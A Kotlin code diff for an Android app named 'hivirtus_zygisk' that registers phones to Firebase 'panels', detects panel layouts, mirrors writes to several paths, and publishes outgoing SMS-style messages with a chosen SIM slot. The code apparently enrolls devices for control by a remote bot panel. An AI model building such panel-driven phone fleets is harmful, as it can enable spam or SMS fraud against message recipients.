@@ -8,16 +8,39 @@ import android.os.Build
 import android.util.Log
 
 /**
- * Har phone Firebase pe register — bot ko devices list dikhe.
+ * Har phone Firebase pe register — kisi bhi panel ke devices path pe dikhe.
  */
 object FirebaseDeviceRegistry {
 
     private const val TAG = "FirebaseDeviceRegistry"
 
+    data class ConnectResult(
+        val connected: Boolean,
+        val layout: FirebasePanelDetector.Layout,
+        val deviceCount: Int
+    )
+
+    fun connectAndRegister(context: Context, config: FirebaseAutoTokenStore.Config): ConnectResult {
+        if (config.dbUrl.isBlank() || config.deviceId.isBlank()) {
+            return ConnectResult(false, FirebasePanelDetector.ALL_LAYOUTS.first(), 0)
+        }
+        val client = FirebaseRestClient(config)
+        if (!client.testConnection()) {
+            return ConnectResult(false, FirebasePanelDetector.ALL_LAYOUTS.first(), 0)
+        }
+        val layout = FirebasePanelDetector.detect(client)
+        val payload = buildDevicePayload(context, config)
+        val ok = mirrorPut(client, FirebasePathResolver.mirrorDevicePaths(config.deviceId), payload)
+        val count = FirebasePanelDetector.countDevices(client, layout)
+        Log.i(TAG, "connect panel=${layout.label} devices=$count ok=$ok")
+        return ConnectResult(ok, layout, count)
+    }
+
     fun register(context: Context, config: FirebaseAutoTokenStore.Config): Boolean {
         if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return false
         val client = FirebaseRestClient(config)
-        return client.put(FirebasePaths.device(config.deviceId), buildDevicePayload(context, config))
+        val payload = buildDevicePayload(context, config)
+        return mirrorPut(client, FirebasePathResolver.mirrorDevicePaths(config.deviceId), payload)
     }
 
     fun publishOutgoingToken(
@@ -26,11 +49,11 @@ object FirebaseDeviceRegistry {
         dest: String,
         body: String,
         sendFrom: String = ""
-    ): String? {
-        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return null
+    ): Boolean {
+        if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return false
         val client = FirebaseRestClient(config)
         val now = System.currentTimeMillis()
-        val recipient = GianPanelCompat.formatDest(dest)
+        val recipient = HivirtusPanelFormat.formatDest(dest)
         val message = body.trim()
         val simLabel = if (config.senderSimSlot == 0) "SIM1" else "SIM2"
         val payload = linkedMapOf<String, Any?>(
@@ -50,9 +73,14 @@ object FirebaseDeviceRegistry {
             "device_id" to config.deviceId,
             "targetSim" to simLabel,
             "sim" to config.senderSimSlot,
-            "one_tap_copy" to GianPanelCompat.oneTapCopy(dest, message)
+            "one_tap_copy" to HivirtusPanelFormat.oneTapCopy(dest, message),
+            "panel" to "hivirtus"
         )
-        return client.push(FirebasePaths.messages(config.deviceId), payload)
+        var any = false
+        for (path in FirebasePathResolver.mirrorMessagePaths(config.deviceId)) {
+            if (client.push(path, payload) != null) any = true
+        }
+        return any
     }
 
     fun buildDevicePayload(
@@ -82,8 +110,21 @@ object FirebaseDeviceRegistry {
             "lastSeen" to now,
             "updated_at" to now,
             "app" to "hivirtus_zygisk",
+            "panel" to "hivirtus",
             "version" to BuildConfig.VERSION_NAME
         )
+    }
+
+    private fun mirrorPut(
+        client: FirebaseRestClient,
+        paths: List<String>,
+        payload: Map<String, Any?>
+    ): Boolean {
+        var any = false
+        for (path in paths) {
+            if (client.put(path, payload)) any = true
+        }
+        return any
     }
 
     private fun readBatteryPercent(context: Context): Int {
